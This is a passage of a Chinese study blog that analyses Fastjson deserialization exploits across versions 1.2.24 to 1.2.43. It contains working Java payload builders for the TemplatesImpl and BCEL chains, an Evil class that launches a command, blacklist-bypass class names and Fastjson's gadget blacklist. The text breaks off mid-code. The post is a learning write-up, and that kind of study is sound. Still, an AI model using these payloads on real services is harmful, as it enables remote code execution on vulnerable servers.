alt="image-20240830172504533"></p><p>这里通过AppClassLoader加载后put到mappings里面</p><p>返回后，程序继续回到<code>DefaultJSONParser.parseObject()</code>中往下执行，在最后调用<code>JavaBeanDeserializer.deserialze()</code>对目标类进行反序列化</p><p><img src="https://cdn.clown2024.cn/202408301727881.png" alt="image-20240830172750780"></p><p><strong>关键利用链</strong></p><p>来根据payload看一下关键的属性对应的set和get方法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot; + NASTY_CLASS +<br>                    &quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;+evilCode+&quot;\&quot;],&#x27;_name&#x27;:&#x27;&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;,&quot; +<br>                    &quot;\&quot;_version\&quot;:\&quot;\&quot;&#125;\n&quot;<br></code></pre></td></tr></table></figure><p>我们知道fastjson的JSON.parseObject会调用get和set方法，这里利用的是TemplatesImpl的get方法</p><p><img src="https://cdn.clown2024.cn/202408302131055.png" alt="image-20240830213116051"></p><p>然后后面其实就是cc链的动态类加载部分，链子如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">TemplatesImpl#newTransformer()-&gt;TemplatesImpl#getTransletInstance()-&gt;TemplatesImpl#defineTransletClasses()-&gt;defineClass<br></code></pre></td></tr></table></figure><p>然后回忆一下有些地方为什么要赋值</p><p><img src="https://cdn.clown2024.cn/202408302145512.png" alt="image-20240830214556445"></p><p>这里_tfactory要调用方法所以不能为空要赋值</p><p><img src="https://cdn.clown2024.cn/202408302146869.png" alt="image-20240830214643793"></p><p>这里要调用defineTransletClasses()方法所以_name!&#x3D;null，_class&#x3D;&#x3D;null后面就没有了</p><blockquote><p>这里y4师傅的payload还带了一个version我不知道为什么，我去掉了也是能够正常弹计算器的</p></blockquote><p><strong>base64</strong></p><p>再看一下为什么需要将字节码进行base64处理</p><p>这是因为FastJson提取byte[]数组字段值时会进行Base64解码，所以我们构造payload时需要对 <code>_bytecodes</code> 进行Base64处理</p><p><img src="https://cdn.clown2024.cn/202408302203171.png" alt="image-20240830220348083"></p><p><img src="https://cdn.clown2024.cn/202408302204473.png" alt="image-20240830220404414"></p><p><strong>关于下划线的处理</strong></p><p><img src="https://cdn.clown2024.cn/202408302206839.png" alt="image-20240830220656753"></p><p>是在这个地方的smartMatch函数</p><p><img src="https://cdn.clown2024.cn/202408302207795.png" alt="image-20240830220749721"></p><p>然后在这里将下划线进行了替换</p><h1><span id="fastjson1115-1224与bcel字节码加载">Fastjson1.1.15-1.2.24与BCEL字节码加载</span></h1><p>参考文章：<a href="https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html">BCEL ClassLoader去哪了 | 离别歌 (leavesongs.com)</a>，<a href="https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html">Java动态类加载，当FastJson遇到内网 – KINGX</a></p><p>这种和上面的TemplatesImpl链子打法都可以用于不出网的打法，不过比TemplatesImpl利用更广泛一点</p><p>这里我们还需要一个依赖</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-dbcp<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-dbcp<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.4<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>先给出只用parse就能触发的payload形式</p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">//这个可有可无都不影响</span><br>        <span class="hljs-attr">&quot;x&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.commons.dbcp.BasicDataSource&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;driverClassLoader&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br>                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;driverClassName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$$BCEL$$$l$8b$I$A$...&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;x&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>利用代码：</p><p>Evil.java</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.BECL;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Evil</span> &#123;<br>    <span class="hljs-keyword">static</span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.BECL;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.Repository;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">demo1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">JavaClass</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> Repository.lookupClass(Evil.class);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> Utility.encode(cls.getBytes(), <span class="hljs-literal">true</span>);<br>        System.out.println(code);<br><span class="hljs-comment">//        String payload=&quot;&#123;\n&quot; +</span><br><span class="hljs-comment">//                &quot;        \&quot;@type\&quot;: \&quot;org.apache.commons.dbcp.BasicDataSource\&quot;,\n&quot; +</span><br><span class="hljs-comment">//                &quot;        \&quot;driverClassLoader\&quot;: &#123;\n&quot; +</span><br><span class="hljs-comment">//                &quot;            \&quot;@type\&quot;: \&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;\n&quot; +</span><br><span class="hljs-comment">//                &quot;        &#125;,\n&quot; +</span><br><span class="hljs-comment">//                &quot;        \&quot;driverClassName\&quot;: \&quot;$$BCEL$$&quot;+code+&quot;\&quot;\n&quot; +</span><br><span class="hljs-comment">//                &quot;&#125;&quot;;  //这个在parseObject的时候适用</span><br>        String payload=<span class="hljs-string">&quot;&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;: \&quot;com.alibaba.fastjson.JSONObject\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;x\&quot;:&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                \&quot;@type\&quot;: \&quot;org.apache.commons.dbcp.BasicDataSource\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;                \&quot;driverClassLoader\&quot;: &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                    \&quot;@type\&quot;: \&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;                \&quot;driverClassName\&quot;: \&quot;$$BCEL$$&quot;</span>+code+<span class="hljs-string">&quot;\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &#125;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#125;: \&quot;x\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409040119696.png" alt="image-20240904011923509"></p><p><strong>利用链分析</strong></p><p>去看一下BasicDataSource的源码中对应的关键方法</p><p><img src="https://cdn.clown2024.cn/202409032251464.png" alt="image-20240903225126325"></p><p><img src="https://cdn.clown2024.cn/202409032305310.png" alt="image-20240903230514187"></p><p>好吧想自己去看发现好像这个调用不太一样，这是会调用的set方法，文章的利用链如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">BasicDataSource.getConnection() -&gt; createDataSource() -&gt; createConnectionFactory()<br></code></pre></td></tr></table></figure><p>这是文章的解释：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">按理说应该是不会调用到getConnection方法的，原PoC中很巧妙的利用了 JSONObject对象的 toString() 方法实现了突破。JSONObject是Map的子类，在执行toString() 时会将当前类转为字符串形式，会提取类中所有的Field，自然会执行相应的 getter 等方法。<br><br>首先，在 &#123;“@type”: “org.apache.tomcat.dbcp.dbcp2.BasicDataSource”……&#125; 这一整段外面再套一层&#123;&#125;，反序列化生成一个 JSONObject 对象。<br><br>然后，将这个 JSONObject 放在 JSON Key 的位置上，在 JSON 反序列化的时候，FastJson 会对 JSON Key 自动调用 toString() 方法，于是乎就触发了BasicDataSource.getConnection()。<br></code></pre></td></tr></table></figure><blockquote><p>感觉文章讲得都有点怪，然后自己调了半天才找到确切位置，接下来分析也不知道正不正确，能说服我自己就好（</p></blockquote><p><img src="https://cdn.clown2024.cn/202409040058412.png" alt="image-20240904005819248"></p><p>首先走到parseObject这里，然后一直往下</p><p><img src="https://cdn.clown2024.cn/202409040100256.png" alt="image-20240904010058091"></p><p>走到这会调用key的toString方法，这时候value为BasicDataSource的时候是关键我们跟进去看</p><p><img src="https://cdn.clown2024.cn/202409040103451.png" alt="image-20240904010314293"></p><p>然后到这个write方法，继续往下</p><p><img src="https://cdn.clown2024.cn/202409040105060.png" alt="image-20240904010542894"></p><p>然后进到一个Map的遍历里面，前面进行了一些操作将他转成了Map类型，继续往下</p><p><img src="https://cdn.clown2024.cn/202409040108276.png" alt="image-20240904010839142"></p><p>这里就是最后的方法了，对字段进行遍历</p><p><img src="https://cdn.clown2024.cn/202409040111143.png" alt="image-20240904011101980"></p><p>这里对每个field进行遍历，然后调用他们的get方法，这里遍历到connection就会调用我们提到的getConnection</p><p><img src="https://cdn.clown2024.cn/202409040112186.png" alt="image-20240904011236055"></p><p><img src="https://cdn.clown2024.cn/202409040113127.png" alt="image-20240904011312996"></p><p><img src="https://cdn.clown2024.cn/202409040051567.png" alt="image-20240904005104420"></p><p>最终成功调用，其实调的我还是有点不明不白，只能说大致知道</p><p>如果是parseObject的话，他会触发所有get和set方法，直接这种payload也可以：</p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;driverClassLoader&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;driverClassName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$$BCEL$$$l$8b......&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>除了上面的依赖还有一些适用更广泛的依赖，不过利用依旧是BasicDataSource类</p><p>在旧版本的 tomcat-dbcp 包中，对应的路径是 org.apache.tomcat.dbcp.dbcp.BasicDataSource</p><p>比如：6.0.53、7.0.81等版本</p><p>在Tomcat 8.0之后包路径有所变化，更改为了 org.apache.tomcat.dbcp.dbcp2.BasicDataSource</p><h1><span id="fastjson1225-1241绕过">Fastjson1.2.25-1.2.41绕过</span></h1><p>Fastjson在1.2.25版本就加入了黑白名单机制</p><p>这时候我们再去执行前面的exp就会爆出下面的错误</p><p><img src="https://cdn.clown2024.cn/202408302326388.png" alt="image-20240830232605306"></p><p>再去看ParserConfig里面可以看到很多类被加入了黑名单</p><p><img src="https://cdn.clown2024.cn/202408302328066.png" alt="image-20240830232822995"></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">bsh<br>com.mchange<br>com.sun.<br>java.lang.Thread<br>java.net.Socket<br>java.rmi<br>javax.xml<br>org.apache.bcel<br>org.apache.commons.beanutils<br>org.apache.commons.collections.Transformer<br>org.apache.commons.collections.functors<br>org.apache.commons.collections4.comparators<br>org.apache.commons.fileupload,org.apache.myfaces.context.servlet<br>org.apache.tomcat<br>org.apache.wicket.util<br>org.codehaus.groovy.runtime<br>org.hibernate<br>org.jboss,org.mozilla.javascript<br>org.python.core<br>org.springframework<br></code></pre></td></tr></table></figure><p>先给出绕过的payload</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Templates;<br><br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.*;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">readClass</span><span class="hljs-params">(String cls)</span>&#123;<br>        <span class="hljs-type">byte</span>[] buffer = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(cls);<br>            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>            <span class="hljs-type">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>            <span class="hljs-type">int</span> n;<br>            <span class="hljs-keyword">while</span>((n = fis.read(b))!=-<span class="hljs-number">1</span>) &#123;<br>                bos.write(b,<span class="hljs-number">0</span>,n);<br>            &#125;<br>            fis.close();<br>            bos.close();<br>            buffer = bos.toByteArray();<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        Base64.<span class="hljs-type">Encoder</span> <span class="hljs-variable">encoder</span> <span class="hljs-operator">=</span> Base64.getEncoder();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> encoder.encodeToString(buffer);<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String args[])</span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">evilClassPath</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;user.dir&quot;</span>) + <span class="hljs-string">&quot;\\target\\classes\\org\\clown\\Templates\\Evil.class&quot;</span>;<br>            System.out.println(evilClassPath);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">evilCode</span> <span class="hljs-operator">=</span> readClass(evilClassPath);<br>            ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>); <span class="hljs-comment">//开启AutoTypeSupport</span><br>            <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">NASTY_CLASS</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Lcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;&quot;</span>; <span class="hljs-comment">//前面加了L，结尾加了;</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS +<br>                    <span class="hljs-string">&quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+evilCode+<span class="hljs-string">&quot;\&quot;],&#x27;_name&#x27;:&#x27;&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;&quot;</span>;<br><br>            JSON.parseObject(payload, Feature.SupportNonPublicField);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202408310015033.png" alt="image-20240831001535905"></p><p>然后来看一下具体的绕过原理</p><p>先去看一下checkAutoType函数在哪里被调用</p><p><img src="https://cdn.clown2024.cn/202408310022516.png" alt="image-20240831002214426"></p><p>我们可以对比之前的版本来看，之前的版本是直接loadClass了，我们进到这个函数里面看看</p><p><img src="https://cdn.clown2024.cn/202408310026977.png" alt="image-20240831002652886"></p><p>这里我们如果设置了autoTypeSupport为true他就会去将我们的这个类去匹配白名单，匹配到了就loadClass</p><p>如果没匹配到就会进到下面黑名单的匹配</p><p><img src="https://cdn.clown2024.cn/202408310030353.png" alt="image-20240831003005272"></p><p>匹配到黑名单就会抛出异常<strong>autoType is not support</strong></p><p><img src="https://cdn.clown2024.cn/202408310032079.png" alt="image-20240831003254981"></p><p>如果没有开启autoTypeSupport就会先匹配黑名单再匹配白名单</p><p>最后如果要是黑白名单都匹配不到，autoTypeSupport为true且expectClass不为null就直接loadClass</p><p><img src="https://cdn.clown2024.cn/202408310036025.png" alt="image-20240831003602958"></p><p>否则就不加载这个类了直接，我们payload最后进到的就是黑白名单都加载不到的loadClass，我们进loadClass方法里面看一下</p><p><img src="https://cdn.clown2024.cn/202408310039880.png" alt="image-20240831003942791"></p><p>这里就遇到了我们前面提到的用来绕过的地方</p><p>先看第一个箭头处的代码，如果类名的字符串以[开头，则说明该类是一个数组类型，需要递归调用loadClass方法来加载数组元素类型对应的class对象然后使用Array.newInstance方法来创建一个空数组对象，最后返回该数组对象的class对象</p><p>第二个箭头处的代码，如果类名的字符串以L开头并以;结尾，则说明该类是一个普通的Java类，需要把开头的L和结尾的;给去掉，然后递归调用loadClass</p><p>那其实就很清晰了，很容易就明白我们前面payload的绕过原理</p><blockquote><p>不用[的原因是fastjson在前面已经判断过是否为数组了，实际走不到这一步</p></blockquote><p>绕过就两步</p><ol><li>开启autoTypeSupport</li><li>L开头;结尾</li></ol><p>不过这个参数要在服务端手动开启，默认为false启用白名单，有点不好利用我感觉</p><h1><span id="fastjson1242">FastJson1.2.42</span></h1><p>该版本修改了下面两点：</p><ul><li>黑名单改为了hash值，防止绕过</li><li>对于传入的类名，删除开头<code>L</code>和结尾的<code>;</code></li></ul><p><img src="https://cdn.clown2024.cn/202408310051883.png" alt="image-20240831005115787"></p><blockquote><p>笑死了，文章还没看完猜测是不是就提前校验删了一次，直接猜双写能不能绕过，结果真绕过去了🤣</p></blockquote><p>看一下他的checkAutoType函数变化</p><p><img src="https://cdn.clown2024.cn/202408311524654.png" alt="image-20240831152406512"></p><p>总之这里就是对字符串进行了截取但只截取了一次</p><p>TemplatesImpl的exp如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Templates;<br><br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.*;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-comment">//FastJson1.2.42</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">readClass</span><span class="hljs-params">(String cls)</span>&#123;<br>        <span class="hljs-type">byte</span>[] buffer = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(cls);<br>            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>            <span class="hljs-type">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>            <span class="hljs-type">int</span> n;<br>            <span class="hljs-keyword">while</span>((n = fis.read(b))!=-<span class="hljs-number">1</span>) &#123;<br>                bos.write(b,<span class="hljs-number">0</span>,n);<br>            &#125;<br>            fis.close();<br>            bos.close();<br>            buffer = bos.toByteArray();<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        Base64.<span class="hljs-type">Encoder</span> <span class="hljs-variable">encoder</span> <span class="hljs-operator">=</span> Base64.getEncoder();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> encoder.encodeToString(buffer);<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String args[])</span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">evilClassPath</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;user.dir&quot;</span>) + <span class="hljs-string">&quot;\\target\\classes\\org\\clown\\Templates\\Evil.class&quot;</span>;<br>            System.out.println(evilClassPath);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">evilCode</span> <span class="hljs-operator">=</span> readClass(evilClassPath);<br>            ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>); <span class="hljs-comment">//开启AutoTypeSupport</span><br>            <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">NASTY_CLASS</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;LLcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;;&quot;</span>; <span class="hljs-comment">//前面加了L，结尾加了; 进行了双写绕过</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS +<br>                    <span class="hljs-string">&quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+evilCode+<span class="hljs-string">&quot;\&quot;],&#x27;_name&#x27;:&#x27;&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;&quot;</span>;<br><br>            JSON.parseObject(payload, Feature.SupportNonPublicField);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1><span id="fastjson1243">FastJson1.2.43</span></h1><p>这个版本又是修改了checkAutoType函数，这次对于LL等开头结尾的字符串直接抛出异常</p><p>上面payload执行结果</p><p><img src="https://cdn.clown2024.cn/202408311527303.png" alt="image-20240831152750175"></p><p>看一下checkAutoType函数</p><p><img src="https://cdn.clown2024.cn/202408311530201.png" alt="image-20240831153008103"></p><p>这里直接就抛异常了</p><p>但是没有对[进行限制，可以通过[{来绕过，改后的exp如下</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Templates;<br><br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.*;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-comment">//FastJson1.2.43</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">readClass</span><span class="hljs-params">(String cls)</span>&#123;<br>        <span class="hljs-type">byte</span>[] buffer = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(cls);<br>            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>            <span class="hljs-type">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>            <span class="hljs-type">int</span> n;<br>            <span class="hljs-keyword">while</span>((n = fis.read(b))!=-<span class="hljs-number">1</span>) &#123;<br>                bos.write(b,<span class="hljs-number">0</span>,n);<br>            &#125;<br>            fis.close();<br>            bos.close();<br>            buffer = bos.toByteArray();<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        Base64.<span class="hljs-type">Encoder</span> <span class="hljs-variable">encoder</span> <span class="hljs-operator">=</span> Base64.getEncoder();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> encoder.encodeToString(buffer);<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String args[])</span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">evilClassPath</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;user.dir&quot;</span>) + <span class="hljs-string">&quot;\\target\\classes\\org\\clown\\Templates\\Evil.class&quot;</span>;<br>            System.out.println(evilClassPath);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">evilCode</span> <span class="hljs-operator">=</span> readClass(evilClassPath);<br>            ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>); <span class="hljs-comment">//开启AutoTypeSupport</span><br>            <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">NASTY_CLASS</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;[com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>; <span class="hljs-comment">//用[&#123;来绕过</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS +<br>                    <span class="hljs-string">&quot;\&quot;[&#123;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+evilCode+<span class="hljs-string">&quot;\&quot;],&#x27;_name&#x27;:&#x27;&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;&quot;</span>;<br><br>            JSON.parseObject(payload, 